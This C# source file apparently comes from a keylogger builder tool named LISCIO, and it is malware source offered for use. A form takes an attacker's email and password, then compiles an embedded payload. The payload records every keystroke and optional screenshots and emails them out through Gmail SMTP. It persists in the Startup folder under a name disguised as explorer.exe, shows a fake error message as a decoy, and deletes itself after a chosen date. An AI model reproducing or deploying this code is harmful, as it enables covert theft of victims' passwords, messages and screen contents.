using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System.Security.Cryptography;

namespace LISCIO
{
    public partial class serverCreate : UserControl
    {


        public serverCreate()
        {
            InitializeComponent();
        }
   
        public static List<string> Settings(string startupTxt, string ErrTxt)
        {
            List<string> _settingsList = new List<string>();
            _settingsList.Add(startupTxt);
            _settingsList.Add(ErrTxt);
            return _settingsList;
        }

        [Obsolete]
        private void mailTestBtn_Click(object sender, EventArgs e)
        {


            if (minuteUp.Value < 1)
            {
                MessageBox.Show("Minute setting is problematic!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

            }
            else if (minuteUp.Value > 59)
            {
                MessageBox.Show("Time cannot exceed 1 hour", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            else if (emailTxt.Text == "" || emailTxt.Text == null)
            {
                MessageBox.Show("Enter your mail address", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

            }
            else if (!emailTxt.Text.Contains("@"))
            {
                MessageBox.Show("Wrong Format!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            else if (delTime.Value <= DateTime.Now)
            {
                MessageBox.Show("Incorrect Date Format", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                if (saveDialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    Dictionary<string, string> version = new Dictionary<string, string>();
                    version.Add("CompilerVersion", "v2.0");
                    CSharpCodeProvider codeProvider = new CSharpCodeProvider(version);
                    ICodeCompiler codeCompiler = codeProvider.CreateCompiler();
                    CompilerParameters cp = new CompilerParameters();
                    cp.ReferencedAssemblies.Add("System.Drawing.dll");
                    
                    cp.GenerateExecutable = true;
                    cp.GenerateInMemory = false;
                    cp.MainClass = "LISCIO.Program";
                    cp.OutputAssembly = saveDialog.FileName + ".exe";
                    cp.ReferencedAssemblies.Add("system.dll");
                    cp.ReferencedAssemblies.Add("system.windows.forms.dll");
                    cp.CompilerOptions = "/target:winexe";
                    CompilerResults cr = codeCompiler.CompileAssemblyFromSource(cp, Codes());
                    foreach (CompilerError item in cr.Errors)
                    {
                        MessageBox.Show(item.ErrorText);
                    
                    }
                    MessageBox.Show("Server created successfully", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }

        }

   string Codes()
        {
           
           string Cod =
                @"
using System;
using System.Web;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;


namespace LISCIO
{
    class Program
    {
        [DllImport(*user32.dll*)]
        static extern short GetAsyncKeyState(int vkey);
        delegate void KontrolHandler();
        static int gonDakika = DK1;
        static int suankiDakika = 0;
        static int dk = 0;
        static string Email = *gonMAILL*;
        static string Sifre = *mailSifre*;
        static string gonEmail = *gonMAILL*;
        static DateTime DelDate = Convert.ToDateTime(*TTT*);
        static int counter=0;
        static void Main()
        {
        if(counter==0){
        MessageBox.Show(*{merhaba}*, *Error*, MessageBoxButtons.OK,MessageBoxIcon.Error);

        counter++;
        }
        

        ExeCopy();
            if (DelDate <= DateTime.Now)
            {
                ExpoldeYourSelf();
                return;
            }
            suankiDakika = NowMinute();
            KontrolHandler h = new KontrolHandler(Kontrol);
            h.BeginInvoke(new AsyncCallback(transEnd), null);
            Console.ReadLine();
            Application.Run(); 
        }
        static void ExpoldeYourSelf()
        {
              System.Diagnostics.Process.Start(*cmd.exe*, */C choice /C Y /N /D Y /T 3 & Del \** + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @*\explorrer.txt*);
              Application.Exit();
              System.Diagnostics.Process.Start(*cmd.exe*, */C choice /C Y /N /D Y /T 3 & Del \** + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @*\Microsoft\Windows\Start Menu\Programs\Startup\explorrer.exe*);
              Application.Exit();
        }
        static Int16 MakeChar(Int16 key)
        {
            Int16[] keycode = { 220, 219, 222, 191, 186, 221 }, charcode = { 199, 286, 304, 214, 350, 220, 231, 287, 105, 246, 351, 252 };
            int keyIndex = Array.IndexOf(keycode, key);
            bool nocaps = (!Control.IsKeyLocked(Keys.CapsLock) && Control.ModifierKeys != Keys.Shift) || (Control.IsKeyLocked(Keys.CapsLock) && Control.ModifierKeys == Keys.Shift);
            if (nocaps && key > 64 && key < 91)
            {
                key = (Int16)(key == 73 ? 305 : key + 32);
            }
            else if (keyIndex != -1)
            {
                key = nocaps ? charcode[keyIndex + 6] : charcode[keyIndex];
            }
            Debug.Write((char)key);
            return key;
        }
        static void Kontrol()
        {
            while (true)
            {
                for (int i = 0; i < Int16.MaxValue; i++)
                {
                    if (GetAsyncKeyState(i).Equals(Int16.MinValue + 1))
                    {
                        char key = Convert.ToChar(MakeChar((Int16)i));
                    KeySave(key.ToString());
                    }
                }
                if (suankiDakika + gonDakika >= 60)
                {
                    dk = (suankiDakika + gonDakika) % 60;
                }
                else
                {
                    dk = suankiDakika + gonDakika;
                }
                if (NowMinute() == dk)
                {
                    suankiDakika = NowMinute();
                    if(Transactions.visualTracking == true)
                    ImageSend();
                    MailSend();
                  

                }
    }
        }
         static void ImageSend(){
             Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                bitmap.Save(@*C:\test.jpg*, ImageFormat.Jpeg);
                bitmap.Dispose();
            }


    }
        

        static void MailSend()
        {
            string _datas = nRead();
            
            MailMessage _messages = new MailMessage(Email, gonEmail, *LOG*, _datas);
            SmtpClient smtp = new SmtpClient(*smtp.gmail.com*, 587);
            smtp.EnableSsl = true;
            smtp.UseDefaultCredentials = true; 
            smtp.Credentials = new NetworkCredential(Email, Sifre);
             
            if(Transactions.visualTracking == true)         
            _messages.Attachments.Add(new Attachment(@*C:\test.jpg*));
            smtp.Send(_messages);
            _messages.Dispose();
            
           

        }
        static string nRead()
        {
            FileStream fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + */explorrer.txt*, FileMode.Open, FileAccess.Read);
            StreamReader sr = new StreamReader(fs);
            string _datas = sr.ReadToEnd();
            fs.Close();
            NDel();
            return _datas;
        }
        static void NDel()
        {
            FileStream fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + */explorrer.txt*, FileMode.Create, FileAccess.Write);
            StreamWriter sw = new StreamWriter(fs);
            sw.Write(**);
            sw.Flush();
            fs.Close();
        }
        static int NowMinute()
        {
            string suan = DateTime.Now.ToShortTimeString();
            int dakika = int.Parse(suan.Substring(suan.IndexOf(':') + 1, suan.Length - suan.IndexOf(':') - 1));
            return dakika;
        }
        static void transEnd(IAsyncResult iar)
        {
        }
        static void KeySave(string _key)
        {
            FileStream fs = null;
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + */explorrer.txt*))
                fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + */explorrer.txt*, FileMode.Append, FileAccess.Write);
            else
                fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + */explorrer.txt*, FileMode.CreateNew, FileAccess.Write);
            StreamWriter sw = new StreamWriter(fs);
            sw.Write(_key);
            sw.Flush();
            fs.Close();
        }
        static void ExeCopy()
        {
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @*\Microsoft\Windows\Start Menu\Programs\Startup\explorer.exe*))
            {
                File.Copy(Path.GetFileName(Application.ExecutablePath), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @*\Microsoft\Windows\Start Menu\Programs\Startup\explorer.exe*);
            }
            
        }
    }
}
";
            if (Transactions.visualTracking == true)
            Cod= Cod.Replace("Transactions.visualTracking", "true");
            else
            Cod = Cod.Replace("Transactions.visualTracking", "false");


            if (Transactions.startUp !=null)
            {
                Cod = Cod.Replace("explorer.exe", Transactions.startUp);
            }
            if (Transactions.errorMessage !=null)
            {
                Cod = Cod.Replace("merhaba", Transactions.errorMessage);
            }
            Cod = Cod.Replace("gonMAILL", emailTxt.Text);
            Cod = Cod.Replace("mailSifre", passTxt.Text);
            Cod = Cod.Replace("DK1", minuteUp.Value.ToString());
            Cod = Cod.Replace("TTT", delTime.Value.ToString());
           
            Cod = Cod.Replace('*', '\"');
          
            return Cod;
        } 

        private void passTxt_OnValueChanged(object sender, EventArgs e)
        {
            passTxt.isPassword = true;
        }

        private void delUpDown_ValueChanged(object sender, EventArgs e)
        {

        }
    }


}

